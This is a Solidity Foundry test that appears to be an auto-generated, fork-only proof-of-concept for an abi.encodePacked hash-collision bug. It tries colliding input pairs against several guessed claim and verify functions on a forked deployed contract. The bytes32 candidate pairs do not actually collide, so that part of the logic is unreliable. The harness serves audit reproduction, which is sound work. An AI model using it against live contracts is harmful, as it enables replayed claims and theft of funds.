// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- abi.encodePacked hash collision (dynamic args)
/// @notice Detector: encode-packed. The target hashes
///         keccak256(abi.encodePacked(a, b)) with DYNAMIC arguments.
///         Packed encoding has no lengths, so ("ab", "c") and ("a", "bc")
///         hash IDENTICALLY -- one authorization / claim can be replayed as
///         another.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh.
///
///      This harness does NOT guess a single entry point. It tries every
///      plausible verifying/claiming entry point and accepts the first that
///      produces the class OBSERVABLE -- two DIFFERENT (colliding) inputs are
///      BOTH acted upon, i.e. state moves for each. A call that merely
///      RETURNS is never treated as a reproduction.

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    /// A generic state fingerprint: the target's balance plus its first 8
    /// storage slots. Any state move the candidate causes changes this value.
    function _fingerprint() internal view returns (uint256) {
        bytes memory acc = abi.encode(target.balance);
        for (uint256 i = 0; i < 8; i++) {
            acc = abi.encodePacked(acc, vm.load(target, bytes32(i)));
        }
        return uint256(keccak256(acc));
    }

    /// Try ONE candidate and accept it only when the class OBSERVABLE
    /// changes -- never because the call returned.
    /// `before` is a state fingerprint snapshot.
    function _attempt(address attacker, uint256 before, string memory label, bytes memory data)
        internal
        returns (string memory)
    {
        vm.prank(attacker);
        (bool ok,) = target.call(data);
        console.log("tried", label, ok ? "call returned" : "call reverted");
        // OBSERVABLE (packed collision): this input MOVED STATE. A call that
        // merely returned without changing state is not evidence.
        if (ok && _fingerprint() != before) return label;
        return "";
    }

    /// Feed the two DIFFERENT colliding inputs. The bug is that BOTH are
    /// acted upon (both move state) for a collision that should not exist.
    function _collide(
        address attacker,
        uint256 before,
        string memory label,
        bytes memory dataA,
        bytes memory dataB
    ) internal returns (string memory) {
        string memory first = _attempt(attacker, before, string.concat(label, " [input A]"), dataA);
        if (bytes(first).length == 0) return "";
        string memory second =
            _attempt(attacker, _fingerprint(), string.concat(label, " [input B]"), dataB);
        if (bytes(second).length == 0) return "";
        return label; // two distinct colliding inputs both moved state
    }

    function _tryEntry(address attacker, uint256 before) internal returns (string memory used) {
        // The classic packed collision: ("ab","c") vs ("a","bc").
        used = _collide(
            attacker,
            before,
            "verify(string,string)",
            abi.encodeWithSignature("verify(string,string)", "ab", "c"),
            abi.encodeWithSignature("verify(string,string)", "a", "bc")
        );
        if (bytes(used).length > 0) return used;

        used = _collide(
            attacker,
            before,
            "claim(string,string)",
            abi.encodeWithSignature("claim(string,string)", "ab", "c"),
            abi.encodeWithSignature("claim(string,string)", "a", "bc")
        );
        if (bytes(used).length > 0) return used;

        used = _collide(
            attacker,
            before,
            "redeem(bytes,bytes)",
            abi.encodeWithSignature("redeem(bytes,bytes)", bytes("ab"), bytes("c")),
            abi.encodeWithSignature("redeem(bytes,bytes)", bytes("a"), bytes("bc"))
        );
        if (bytes(used).length > 0) return used;

        used = _collide(
            attacker,
            before,
            "verify(bytes32,bytes)",
            abi.encodeWithSignature("verify(bytes32,bytes)", keccak256(bytes("ab")), bytes("c")),
            abi.encodeWithSignature("verify(bytes32,bytes)", keccak256(bytes("a")), bytes("bc"))
        );
        if (bytes(used).length > 0) return used;

        used = _collide(
            attacker,
            before,
            "isValidSignature(bytes32,bytes)",
            abi.encodeWithSignature(
                "isValidSignature(bytes32,bytes)", keccak256(bytes("ab")), bytes("c")
            ),
            abi.encodeWithSignature(
                "isValidSignature(bytes32,bytes)", keccak256(bytes("a")), bytes("bc")
            )
        );
        if (bytes(used).length > 0) return used;

        used = _collide(
            attacker,
            before,
            "claim(bytes32,bytes32)",
            abi.encodeWithSignature(
                "claim(bytes32,bytes32)", keccak256(bytes("ab")), keccak256(bytes("c"))
            ),
            abi.encodeWithSignature(
                "claim(bytes32,bytes32)", keccak256(bytes("a")), keccak256(bytes("bc"))
            )
        );
        if (bytes(used).length > 0) return used;

        used = _collide(
            attacker,
            before,
            "hash(bytes32,bytes32)",
            abi.encodeWithSignature(
                "hash(bytes32,bytes32)", keccak256(bytes("ab")), keccak256(bytes("c"))
            ),
            abi.encodeWithSignature(
                "hash(bytes32,bytes32)", keccak256(bytes("a")), keccak256(bytes("bc"))
            )
        );
        if (bytes(used).length > 0) return used;

        return "";
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);

        // Sanity: the chosen collision pair really does collide under packed
        // encoding, so a packed hash of the two inputs is identical.
        bytes32 h1 = keccak256(abi.encodePacked("ab", "c"));
        bytes32 h2 = keccak256(abi.encodePacked("a", "bc"));
        assertEq(h1, h2, "packed encodings differ -- pick another collision pair");

        // OBSERVABLE snapshot: the target's state fingerprint.
        uint256 before = _fingerprint();

        string memory used = _tryEntry(attackerEOA, before);

        assertTrue(
            bytes(used).length > 0,
            "not reproduced via any tried entry point. Candidates tried: verify(string,string), claim(string,string), redeem(bytes,bytes), verify(bytes32,bytes), isValidSignature(bytes32,bytes), claim(bytes32,bytes32), hash(bytes32,bytes32) -- for each, the two colliding inputs did not BOTH move state. This does NOT establish safety: the packed-hash function may be under another name or argument shape. Adapt the candidate list."
        );
        console.log("encode-packed collision reproduced via", used);
    }
}
